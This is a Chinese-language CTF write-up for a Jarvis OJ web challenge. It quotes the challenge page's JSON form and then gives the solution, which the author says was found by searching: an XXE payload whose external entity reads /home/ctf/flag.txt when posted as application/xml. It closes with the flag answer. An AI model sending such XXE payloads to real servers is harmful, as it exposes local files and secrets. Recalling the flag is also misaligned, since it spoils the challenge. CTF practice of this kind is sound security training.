## 描述

请设法获得目标机器/home/ctf/flag.txt中的flag值。

题目入口：http://web.jarvisoj.com:9882/

## 题解

```html
<html>
<head>
<link href="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.5.0/bootstrap3-editable/css/bootstrap-editable.css" rel="stylesheet"/>
<script src="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.5.0/bootstrap3-editable/js/bootstrap-editable.min.js"></script>
</head>
<body>
<div class="show">
<textarea id="tip-area" width=100px height=50px disabled></textarea>
</div>
<div class="control-area">
<input id="evil-input" type="text" width=100px height=50px value="type sth!"/>
<button class="btn btn-default" type="button" onclick="send()">Go!</button>
</div>
<script>
function XHR() {
        var xhr;
        try {xhr = new XMLHttpRequest();}
        catch(e) {
            var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"];
            for (var i=0,len=IEXHRVers.length;i< len;i++) {
                try {xhr = new ActiveXObject(IEXHRVers[i]);}
                catch(e) {continue;}
            }
        }
        return xhr;
    }

function send(){
 evil_input = document.getElementById("evil-input").value;
 var xhr = XHR();
     xhr.open("post","/api/v1.0/try",true);
     xhr.onreadystatechange = function () {
         if (xhr.readyState==4 && xhr.status==201) {
             data = JSON.parse(xhr.responseText);
             tip_area = document.getElementById("tip-area");
             tip_area.value = data.task.search+data.task.value;
         }
     };
     xhr.setRequestHeader("Content-Type","application/json");
     xhr.send('{"search":"'+evil_input+'","value":"own"}');
}
</script>
</body>
</html>
```

可以看到就是一个简单的表单提交操作，试了几下完全没得头绪，随之搜索题解。

正解是利用 XXE 漏洞，即 XML 实体攻击，需要我们构造一个 XML

```xml
<?xml version="1.0"?>
<!DOCTYPE ggmf[<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt">]>

<tg>&xxe;</tg>
```

然后以 `Content-Type: application/xml` 的方式提交，就能得到答案了。

## 答案

CTF{XxE_15_n0T_S7range_Enough}
